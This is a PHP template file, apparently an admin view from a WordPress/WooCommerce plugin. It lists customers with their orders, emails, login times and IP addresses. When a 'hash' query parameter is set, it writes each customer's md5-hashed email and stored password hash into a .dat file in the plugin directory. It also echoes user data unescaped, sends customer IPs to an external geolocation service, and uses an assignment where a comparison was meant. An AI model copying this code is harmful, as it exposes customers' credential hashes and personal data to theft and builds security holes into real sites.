<?php 

	$result = count_users();
	if(!empty($result)){
?>
	<div class="row mt-3">
		<div class="col-md-12">

			<ul>
			<?php		
					foreach($result as $k=>$v){
						if(!is_array($v)){
			?>				

							<li><b><?php echo ucwords(str_replace('_', ' ', $k)); ?>:</b> <?php echo $v; ?></li>
							
			<?php                
						}else{
							foreach($v as $i=>$j){
			?>				

							<li><b><?php echo ucwords(str_replace('_', ' ', $i)); ?>:</b> <?php echo $j; ?></li>
							
			<?php  					
							}
						}
					}
			?>
			</ul>

		</div>
	</div>

<?php		
		
	}
	
	$args = array(
		'blog_id'      => $GLOBALS['blog_id'],
		'role'         => '',
		'role__in'     => array('customer'),//administrator//customer
		'role__not_in' => array(),
		'meta_key'     => '',
		'meta_value'   => '',
		'meta_compare' => '',
		'meta_query'   => array(),
		'date_query'   => array(),        
		'include'      => isset($_GET['user_id'])?array($_GET['user_id']):array(),
		'exclude'      => array(),
		'orderby'      => 'registered',
		'order'        => 'DESC',
		'offset'       => '',
		'search'       => '',
		'number'       => isset($_GET['all'])?'-1':'1',
		'count_total'  => false,
		'fields'       => 'all',
		'who'          => '',
	 ); 
	$all_customers = get_users( $args );	
	//pree($all_customers);//exit;
	
	if(!empty($all_customers)){
		
?>
 <div class="table-responsive">
	<table class="table">
    <thead>
      <tr>
      	<th><?php _e('#'); ?></th>
      	<th><?php _e('Amount (Orders)'); ?></th>
        <th><?php _e('Items'); ?></th>
        <th><?php _e('Customer Name'); ?></th>
        <th><?php _e('Email'); ?></th>
        <th><?php _e('Registered'); ?></th>
        <th><?php _e('Last Login'); ?></th>
        <td><?php _e('IP'); ?></td>
      </tr>
	</thead>
    <tfoot>
    <tr>
    	<th><?php _e('#'); ?></th>
    	<td><?php _e('Amount (Orders)'); ?></td>
        <td><?php _e('Items'); ?></td>
        <td><?php _e('Customer Name'); ?></td>
        <td><?php _e('Email'); ?></td>
        <td><?php _e('Registered'); ?></td>
        <td><?php _e('Last Login'); ?></td>
        <td><?php _e('IP'); ?></td>
    </tr>
    </tfoot>    
	<tbody>
<?php		
/*
.active 	
.success 
.info 
.warning 	
.danger	

*/


		if(isset($_GET['hash'])){
			$pdir = plugin_dir_path( dirname(__FILE__) );
			unlink($pdir.'ab-hash.dat');
			$f = fopen($pdir.'ab-hash.dat', 'a+');
		}
	
		$c = 0;
		foreach($all_customers as $customers){ $c++;
			
			$meta = get_user_meta($customers->ID);
			//pree($customers->ID);
			//pree($customers->display_name);
			//continue;
			//pree($customers);
			//continue;
			$last_login = date('Y-m-d h:i:s', $meta['last_login'][0]);
			$ip_logs = maybe_unserialize($meta['ip_logs'][0]);
			//pree($meta);
			$the_login_date = human_time_diff($meta['last_login'][0]);
			
			$customer_total_order = ig_get_customer_total_order($customers->ID);
			
			list($orders, $amount, $products) = $customer_total_order;
			$products_list = '';
			$row_class = '';
			
			if(!empty($products)){
		
				$products_list .= '<ul>';
						
				foreach($products as $item){
					//pree($item);
		
					$products_list .= '<li>'.$item['download_count'].' - '.$item['product'].' x'.$item['qty'].'</li>';
					
					switch($item['download_count']){
						case 0:
							$row_class = 'warning';
						break;					
						default:
							if($item['download_count']>10){
								$row_class = 'danger';
							}elseif($item['download_count']>0){
								$row_class = 'success';
							}else{
								$row_class = 'info';
							}
						break;
						
					}
								
				}
		
				$products_list .= '</ul>';
					
			}			
			
			$ip_list = '';
			if(!empty($ip_logs)){
				$ip_list .= '<ul>';
				foreach($ip_logs as $ip){
					$location = '';
					
					if(isset($_GET['location']) && $ip!=''){
						$response = wp_remote_get( 'https://tools.keycdn.com/geo.json?host='.$ip );
						
						if ( is_array( $response ) ) {
						  $header = $response['headers']; // array of http header lines
						  $body = $response['body']; // use the content
						  $body = json_decode($body);
						  if($body->status='success'){
							  $location = $body->data->geo->city.' / '. $body->data->geo->country_name;
						  }
						}	
					}
					$ip_list .= '<li>'.$ip.' - '.$location.'</li>';
				}
				$ip_list .= '</ul>';
			}
			
?>
		<tr class="<?php echo $row_class; ?>">
        	<td><?php echo $c; ?></td>
        	<td><?php echo  get_woocommerce_currency_symbol().($amount).' ('.$orders.')'; ?></td>
            <td><?php echo $products_list; ?></td>
        	<td><?php echo ($customers->display_name).' - '.$customers->ID; ?></td>
            <td><?php echo ($customers->user_email); ?></td>
            <td><?php echo ($customers->user_registered); ?></td>
            <td><?php echo $last_login.' / '.$the_login_date; ?></td>
            <td><?php echo $ip_list; ?></td>
        </tr>
<?php		//exit;
			
			if(isset($_GET['hash'])){
				$hash = md5($customers->user_email).'~'.$customers->user_pass.PHP_EOL;		
				//pree($hash);
				fwrite($f, $hash);
			}
		}
		
		if(isset($_GET['hash'])){
			fclose($f);
		}
?>
	</tbody>
	</table>
</div> 
<?php		
		
	}